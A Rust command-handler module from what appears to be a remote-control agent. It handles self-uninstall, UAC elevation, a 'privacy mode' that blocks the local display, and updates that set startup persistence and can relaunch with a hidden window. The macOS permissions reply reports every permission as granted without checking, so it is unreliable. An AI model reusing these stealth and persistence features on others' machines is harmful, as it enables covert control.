use std::sync::atomic::Ordering;

use sha2::Digest;

use crate::{
    commands::{Ctx, desktop},
    protocol::{self, Obj},
};

pub async fn handle(ctx: Ctx) {
    match ctx.command.name.as_str() {
        "agent_update" => agent_update(&ctx).await,
        "uninstall" => {
            ctx.out.result(&ctx.command, true, None).await;
            #[cfg(windows)]
            {
                let name = ctx.state.config.startup_name.clone();
                crate::win::shell::remove_persistence(&name);
                if let Ok(current) = std::env::current_exe() {
                    let _ = std::fs::remove_file(current);
                }
            }
            tokio::time::sleep(std::time::Duration::from_millis(150)).await;
            std::process::exit(0);
        }
        "disconnect" => {
            ctx.out.result(&ctx.command, true, None).await;
            ctx.state.stop_streams();
            ctx.state.consoles.stop_all();
            ctx.state.request_reconnect(true);
            tokio::time::sleep(std::time::Duration::from_millis(150)).await;
            std::process::exit(0);
        }
        "reconnect" => {
            ctx.out.result(&ctx.command, true, None).await;
            ctx.state.stop_streams();
            ctx.state.consoles.stop_all();
            ctx.state.request_reconnect(false);
        }
        "elevate" => {
            #[cfg(windows)]
            {
                if crate::win::is_admin() {
                    ctx.out
                        .result(&ctx.command, true, Some("already running as admin"))
                        .await;
                } else {
                    match crate::win::shell::elevate_current() {
                        Ok(()) => {
                            ctx.out
                                .result(
                                    &ctx.command,
                                    true,
                                    Some("elevating - new process started as admin via UAC"),
                                )
                                .await
                        }
                        Err(error) => {
                            ctx.out.result(&ctx.command, false, Some(&error)).await
                        }
                    }
                }
            }
            #[cfg(not(windows))]
            {
                ctx.out
                    .result(&ctx.command, false, Some("elevation via password is only supported on macOS"))
                    .await;
            }
        }
        "privacy_start" => {
            #[cfg(windows)]
            {
                if ctx.state.privacy.load(Ordering::Relaxed) {
                    ctx.out
                        .result(&ctx.command, true, Some("privacy mode already active"))
                        .await;
                } else {
                    crate::win::privacy_block(true);
                    ctx.state.privacy.store(true, Ordering::Relaxed);
                    ctx.out.result(&ctx.command, true, None).await;
                }
            }
            #[cfg(not(windows))]
            {
                ctx.out
                    .result(&ctx.command, false, Some("privacy mode is only supported on Windows"))
                    .await;
            }
        }
        "privacy_stop" => {
            if ctx.state.is_privacy() {
                desktop::stop_privacy(&ctx.state);
            }
            ctx.out.result(&ctx.command, true, None).await;
        }
        "privacy_status" => {
            ctx.out
                .send(
                    Obj::new()
                        .put(protocol::key_type(), protocol::s("privacy_status"))
                        .put(protocol::key_enabled(), protocol::b(ctx.state.is_privacy()))
                        .value(),
                )
                .await;
        }
        "client_logs_request" => {
            ctx.out
                .send(
                    Obj::new()
                        .put(protocol::key_type(), protocol::s("client_logs_result"))
                        .put(protocol::key_command_id(), protocol::s(&ctx.command.id))
                        .put(protocol::key_ok(), protocol::b(false))
                        .put(protocol::key_entries(), protocol::arr(Vec::new()))
                        .put(protocol::key_dropped(), protocol::n(0))
                        .put(protocol::key_from_seq(), protocol::n(0))
                        .put(protocol::key_to_seq(), protocol::n(0))
                        .put(protocol::key_enabled(), protocol::b(false))
                        .put(protocol::key_error(), protocol::s("secure logging is not configured"))
                        .value(),
                )
                .await;
        }
        "darwin_request_permissions" => {
            #[cfg(target_os = "macos")]
            {
                let message = serde_json::json!({
                    "permissions": {
                        "accessibility": true,
                        "screenRecording": true,
                        "fullDiskAccess": true,
                        "inputMonitoring": true,
                    },
                    "missing": [],
                });
                ctx.out
                    .result(&ctx.command, true, Some(&message.to_string()))
                    .await;
            }
            #[cfg(not(target_os = "macos"))]
            {
                ctx.out
                    .result(&ctx.command, false, Some("permission requests are only supported on macOS"))
                    .await;
            }
        }
        _ => {
            ctx.out
                .result(&ctx.command, false, Some("unknown system command"))
                .await;
        }
    }
}

async fn agent_update(ctx: &Ctx) {
    let path = ctx.string("path").unwrap_or("").trim().to_owned();
    let expected = ctx.string("hash").unwrap_or("").trim().to_lowercase();
    let hide_window = ctx.boolean_or("hideWindow", false);
    if path.is_empty() {
        ctx.out
            .result(&ctx.command, false, Some("missing update path"))
            .await;
        return;
    }
    if !expected.is_empty() {
        match tokio::fs::read(&path).await {
            Ok(data) => {
                let digest = sha2::Sha256::digest(&data);
                let actual = digest.iter().map(|byte| format!("{byte:02x}")).collect::<String>();
                if actual != expected {
                    ctx.out
                        .result(&ctx.command, false, Some("integrity check failed"))
                        .await;
                    return;
                }
            }
            Err(error) => {
                ctx.out
                    .result(&ctx.command, false, Some(&error.to_string()))
                    .await;
                return;
            }
        }
    }
    let state = ctx.state.clone();
    let persistence = state.config.persistence;
    let startup_name = state.config.startup_name.clone();
    let current = std::env::current_exe().ok();
    let source = path.clone();
    ctx.out.result(&ctx.command, true, None).await;
    tokio::time::sleep(std::time::Duration::from_millis(250)).await;
    tokio::task::spawn_blocking(move || {
        #[cfg(windows)]
        {
            use std::os::windows::process::CommandExt;
            let mut restart = std::path::PathBuf::from(&source);
            if persistence {
                if let Ok(target) = crate::win::shell::install_persistence(&startup_name) {
                    if target != std::path::Path::new(&source) {
                        if std::fs::copy(&source, &target).is_ok() {
                            restart = target;
                        }
                    }
                }
            } else if let Some(current) = &current {
                if current == std::path::Path::new(&source) {
                    // Re-running the same file is safe; the old process exits below.
                    restart = current.clone();
                }
            }
            let _ = std::process::Command::new(&restart)
                .creation_flags(if hide_window { 0x08000000 } else { 0 })
                .spawn();
        }
        #[cfg(not(windows))]
        {
            let _ = hide_window;
            let _ = persistence;
            let _ = startup_name;
            let _ = current;
            let _ = std::process::Command::new(&source).spawn();
        }
        std::process::exit(0);
    })
    .await
    .ok();
}
